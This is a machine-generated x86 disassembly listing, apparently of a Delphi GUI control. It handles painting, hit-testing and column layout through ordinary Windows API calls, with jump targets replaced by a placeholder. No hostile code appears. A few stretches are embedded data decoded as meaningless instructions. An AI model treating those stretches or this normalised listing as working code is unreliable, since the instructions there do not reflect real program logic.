mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_4252d4
xor eax eax
push ebp
push sub_436e51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_4256c8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_425568
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424bc0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424cdc
mov eax [ ebp - 0x10 ]
test [ eax + 0x10 ] 0x1
setne al
push eax
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4364b0
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e58
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
xor edx edx
call sub_4256c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
call sub_425540
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_436e68
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov esi [ edx + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xfffffed2
jg r-xdata
sub eax 0xfffffed3
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
test [ eax ] 0x1
je r-xdata
sub eax 0x11d
je r-xdata
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4364b0
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_4034ac
jmp r-xdata
sub eax 0xfffffec9
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4364b0
mov ebx eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je r-xdata
jmp r-xdata
xor eax eax
mov [ edx + 0xc ] eax
call GetMessagePos
and eax 0xffff
mov [ ebp - 0x15 ] eax
lea eax [ ebp - 0x15 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ScreenToClient
mov eax [ ebp - 0x4 ]
call sub_44f29c
sar eax 0x1
jns r-xdata
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov [ ebx + 0x10 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4034ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_437698
mov [ ebp - 0x11 ] eax
lea eax [ ebp - 0x15 ]
push eax
push 0x0
push 0x1206
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SendMessageA
mov [ ebp - 0x39 ] 0x80
cmp [ ebp - 0x9 ] 0x0
jge r-xdata
adc eax 0x0
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4364b0
mov ebx eax
mov eax [ esi + 0x8 ]
sub eax 0xfffffecd
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x9 ]
call sub_42a570
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x19 ]
mov [ eax + 0x21c ] edx
test [ ebp - 0xc ] 0x8
je r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0xd ]
test ah 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x21c ] edx
jmp r-xdata
xor edx edx
push ebp
push sub_436ffe
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
dec eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21c ] eax
jmp r-xdata
test al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
lea ecx [ ebp - 0x39 ]
mov edx [ esi + 0xc ]
call sub_42a570
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x19 ]
mov [ eax + 0x218 ] ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4364b0
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4364b0
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43742c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp r-xdata
mov eax [ esi + 0x14 ]
mov esi eax
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] eax
call GetMessagePos
mov edx eax
and edx 0xffff
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x238 ] edx
shr eax 0x10
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ScreenToClient
mov eax [ ebx + 0x18 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov al [ ebp - 0x5 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] eax
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x230 ] edx
sub_437130
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop ecx
pop ebp
retn
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x26
call SystemParametersInfoA
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
pop ecx
pop ebp
retn
sub_437168
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ edi ] 0x200
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_453a68
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_437130
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44fa7c
test al al
je r-xdata
movsx ebx [ edi + 0x8 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x238 ]
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x234 ]
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x230 ]
mov eax [ esi + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ esi + 0x18 ]
cmp ebx eax
jle r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
push 0x1
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4034ac
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub ebx eax
mov [ ebp - 0x5 ] 0x1
sub [ edi + 0x8 ] bx
sub_43720c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
movsx eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ edi + 0xa ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x0
push 0x1206
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
mov edx edi
mov eax ebx
call sub_450ef0
test [ esp + 0x8 ] 0x2
je r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_4364b0
cmp [ eax + 0x1e ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43726c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_454640
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_437407
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44f258
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032b0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_4373ea
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_418854
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4189b0
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_4364b0
mov esi eax
cmp [ esi + 0x1f ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4189b0
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_436408
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4188a0
mov eax [ esi + 0x10 ]
sub [ ebp - 0xc ] eax
sub_43742c
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
push esp
mov edx edi
mov eax esi
mov si 0xffb1
call sub_4034ac
mov al [ esp ]
pop edx
pop edi
pop esi
retn
sub_43744c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44ed24
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x228 ]
jne r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_437480
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x228 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x228 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x224 ]
call sub_45d560
mov eax ebx
call sub_456054
xor edx edx
call sub_42a58c
mov edx [ ebx + 0x224 ]
call sub_45d5a4
mov edx ebx
mov eax [ ebx + 0x228 ]
call sub_421440
mov eax [ ebx + 0x228 ]
call sub_45cbd0
push eax
mov eax ebx
call sub_456054
pop edx
call sub_42a58c
jmp r-xdata
mov eax ebx
call sub_436cd4
pop esi
pop ebx
retn
sub_4374f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_45cbd0
push eax
mov eax ebx
call sub_456054
pop edx
call sub_42a58c
mov eax ebx
call sub_436cd4
pop esi
pop ebx
retn
sub_43751c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_43756c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43768b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_437668
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4196c0
push eax
mov eax esi
call sub_419390
mov edx eax
pop eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419720
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_456054
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42a59c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43766f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_4364b0
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec esi
jne r-xdata
sub_437698
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
push ebp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4364b0
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x218 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4364b0
pop edx
call sub_43756c
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4034ac
pop esi
pop ecx
pop ebp
retn
sub_437714
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x272 ] 0x0
je r-xdata
mov ecx [ ebx + 0x208 ]
mov dl 0x1
mov eax [ esp ]
call [ eax + 0x1c ]
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_437784
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax esi
call sub_419720
mov [ ebx + 0x28 ] eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_419304
mov [ ebx + 0x24 ] 0x32
mov [ ebx + 0xc ] 0x0
or eax 0xffffffff
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x21 ] 0x3
xor edx edx
mov [ ebp - 0x1d ] edx
mov edx [ ebx + 0x24 ]
mov [ ebp - 0x19 ] edx
mov [ ebp - 0x9 ] eax
mov edi esi
mov eax edi
call sub_437d60
call sub_456358
test al al
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_419390
push eax
mov eax edi
call sub_437d60
call sub_456054
lea ecx [ ebp - 0x21 ]
pop edx
call sub_42a74c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_43782c
push ebx
push esi
push edi
push ebp
call sub_403664
mov ebx edx
mov ebp eax
mov edi [ ebp + 0x4 ]
mov esi edi
mov eax edi
call sub_437d60
call sub_456358
test al al
je r-xdata
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41933c
mov eax esi
call sub_437d9c
test bl bl
jle r-xdata
mov eax ebp
call sub_419390
push eax
mov eax [ ebp + 0x4 ]
call sub_437d60
call sub_456054
pop edx
call sub_42a75c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40364c
sub_43788c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419098
push ebx
push r-xdata
push ebx
push sub_4378fc
cmp [ ebx + 0x24 ] 0xffffffff
setle cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4378d2
add [ eax ] al
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41d0bc
mov eax ebx
call sub_41d00c
mov edx eax
mov eax esi
call sub_437ba8
mov eax ebx
call sub_41d0c4
pop esi
pop ebx
retn
sub_4378fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_41f2f0
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_41f224
mov eax ebx
call sub_41f2f8
pop esi
pop ebx
retn
sub_437920
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_437d60
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_456358
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x289 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_41aeec
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov edx [ ebp - 0x8 ]
mov [ edx + 0x248 ] eax
jmp r-xdata
push 0x400
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8e0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437a06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_41ea64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032b0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x248 ]
call sub_41ae88
retn
sub_437a1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419720
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_41936c
push ebp
call sub_437920
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_419728
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_437a7a
inc ebx
add [ ecx ] dl
add ebp [ esi ]
cmp [ esi ] dh
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
call [ eax - 0x75 ]
inc esi
add al 0xe8
dec esp
add al [ eax ]
add al ch
cmp esp ebp
add [ eax ] eax
insb
jae r-xdata
inc ebp
cld
mov eax [ eax + 0x4 ]
call sub_419720
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
rcl [ ebp - 0x75 ] 0xec
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_437b3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4194b8
mov eax [ esi + 0x4 ]
call sub_419720
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov eax [ esi + 0x4 ]
call sub_419720
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_419720
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_41936c
push ebp
call sub_437920
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
mov ecx [ ebp - 0x4 ]
pop edx
call sub_42a964
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437b45
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405298
retn
mov eax [ esi + 0x4 ]
call sub_419720
push eax
mov eax [ esi + 0x4 ]
call sub_437d60
call sub_456054
inc edi
xor ebx ebx
inc esi
dec ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_419728
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_419728
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_437b4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx esi
call sub_4044b8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_404100
mov eax ebx
call sub_437a1c
sub_437b74
push ebx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
pop ebx
retn
mov eax ebx
call sub_419390
push eax
mov eax [ ebx + 0x4 ]
call sub_437d60
call sub_456054
pop edx
call sub_42a774
mov [ ebx + 0x24 ] eax
sub_437ba8
cmp edx [ eax + 0x24 ]
je r-xdata
retn
mov ecx [ eax + 0x18 ]
cmp edx ecx
jge r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jle r-xdata
test edx edx
jl r-xdata
mov [ eax + 0x24 ] edx
call sub_437a1c
cmp ecx edx
jge r-xdata
mov edx ecx
jmp r-xdata
mov edx ecx
sub_437bd4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_419390
test eax eax
je r-xdata
mov [ esi + 0xc ] bl
xor edx edx
mov eax esi
call sub_41936c
mov eax [ esi + 0x4 ]
call sub_437d60
mov edx [ eax ]
call [ edx + 0x80 ]
sub_437c0c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0xd ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xd ] dl
mov eax [ ebx + 0x4 ]
call sub_437d60
test eax eax
je r-xdata
mov eax ebx
call sub_437a1c
mov eax [ ebx + 0x4 ]
call sub_437d60
mov si 0xffee
call sub_4034ac
sub_437c70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418fac
pop esi
pop ebx
retn
mov dl [ esi + 0xc ]
mov eax ebx
call sub_437bd4
mov dl [ esi + 0xd ]
mov eax ebx
call sub_437c0c
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_437b4c
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_437c40
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_437c50
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_437c60
mov eax esi
call sub_437b74
mov edx eax
mov eax ebx
call sub_437ba8
pop esi
pop ebx
retn
sub_437ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_404100
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4193a8
sub_437d08
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_4194e8
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_437d68
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_437d60
call sub_43c3b4
pop esi
pop ebx
retn
mov eax esi
call sub_419390
push eax
mov eax ebx
call sub_437d60
pop edx
call sub_43c3f4
pop esi
pop ebx
retn
sub_437d9c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_437d60
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_437e77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419720
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_437d60
call sub_456054
mov edx ebx
call sub_42a75c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_437d60
call sub_43c3b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc esi
xor ebx ebx
mov [ edi ] 0x3
xor eax eax
mov [ edi + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437d4c
mov eax [ eax + 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_437d60
call sub_456054
mov ecx edi
mov edx ebx
call sub_42a74c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437d4c
mov [ eax + 0x28 ] ebx
inc ebx
dec esi
jne r-xdata
sub_437e88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419304
mov [ esi + 0x20 ] 0xff000008
lea eax [ esi + 0x1c ]
call sub_4040ac
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_437ee0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_404100
mov dl 0x1
mov eax ebx
call sub_41936c
pop esi
pop ebx
retn
sub_437f10
inc [ eax ]
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jo r-xdata
insb
jae r-xdata
fimul [ ebx + 0x177ce8c7 ]
lea edi [ ecx + edx * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
